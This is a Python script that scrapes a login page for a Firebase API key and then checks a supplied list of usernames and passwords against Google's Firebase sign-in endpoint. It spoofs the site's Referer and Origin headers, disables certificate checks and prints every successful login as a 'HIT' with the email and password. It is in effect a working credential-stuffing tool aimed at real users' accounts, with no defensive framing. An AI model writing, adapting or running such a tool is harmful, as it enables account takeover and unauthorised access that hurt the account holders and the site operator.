#!/usr/bin/env python3
"""Probe a login page: detect Firebase-delegated auth, classify credentials.

Usage: python firebase_probe.py <host> <login_path> [creds.json]

Step 1 prints whether the form delegates to Firebase and the API key.
Step 2 tests each {user,pass} in creds.json (or a single stdin JSON list)
and prints the verdict distribution. Exit 2 = no Firebase found.
"""
import ssl, socket, re, sys, json, time, urllib.request

def html(host, path):
    ctx = ssl.create_default_context(); ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE; ctx.options |= 0x4   # legacy renegotiation
    with socket.create_connection((host, 443), timeout=12) as s:
        with ctx.wrap_socket(s, server_hostname=host) as sock:
            sock.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                         f"User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode())
            d = b''
            while True:
                c = sock.recv(65536)
                if not c: break
                d += c
    return d.decode('utf-8', errors='ignore')

def verdict(key, email, pw, host):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={key}"
    req = urllib.request.Request(
        url, data=json.dumps({"email": email, "password": pw,
                              "returnSecureToken": True}).encode(),
        headers={'Content-Type': 'application/json',
                 'Referer': f'https://{host}/', 'Origin': f'https://{host}'})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return 'SUCCESS' if 'idToken' in json.loads(r.read()) else 'UNKNOWN'
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read()).get('error', {}).get('message', f'HTTP{e.code}')
        except Exception:
            return f'HTTP{e.code}'
    except Exception as ex:
        return 'ERR:' + str(ex)[:40]

def main():
    host, path = sys.argv[1], sys.argv[2]
    page = html(host, path)
    m = re.search(r"apiKey:\s*'([^A-Za-z0-9]*)((?:AIza|)[^']+)'", page) or \
        re.search(r"apiKey:\s*['\"]([^'\"]+)['\"]", page)
    if not m:
        print("No Firebase apiKey in page — auth is not Firebase-delegated here.")
        sys.exit(2)
    key = m.group(1) + m.group(2) if m.lastindex == 2 else m.group(1)
    proj = re.search(r"authDomain:\s*'([^']+)'", page)
    print(f"Firebase project: {proj.group(1) if proj else '?'}  (key len {len(key)})")

    domain = ''
    d = re.search(r"email_domain\s*=\s*'([^']*)'", page)
    if d: domain = d.group(1)

    creds = json.load(open(sys.argv[3])) if len(sys.argv) > 3 else json.load(sys.stdin)
    tally = {}
    for c in creds:
        u, p = (c if isinstance(c, list) else (c['user'], c['pass']))
        email = u if '@' in u else u + domain
        v = verdict(key, email, p, host)
        tally[v] = tally.get(v, 0) + 1
        if v == 'SUCCESS':
            print(f"  HIT  {email} : {p}")
        time.sleep(0.25)
    print("\n--- verdict distribution ---")
    for v, n in sorted(tally.items(), key=lambda x: -x[1]):
        print(f"  {v:28s} {n}")
    return tally

if __name__ == '__main__':
    main()